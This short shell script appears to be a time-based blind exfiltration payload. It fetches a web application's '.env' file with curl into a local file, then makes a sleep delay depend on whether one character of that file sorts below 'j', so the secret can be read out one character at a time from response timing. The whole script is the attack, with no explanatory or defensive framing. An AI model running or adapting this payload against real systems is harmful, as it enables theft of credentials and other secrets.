#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +7 /wa|head -c1)" < 'j' ]&&sleep 25
sleep 12
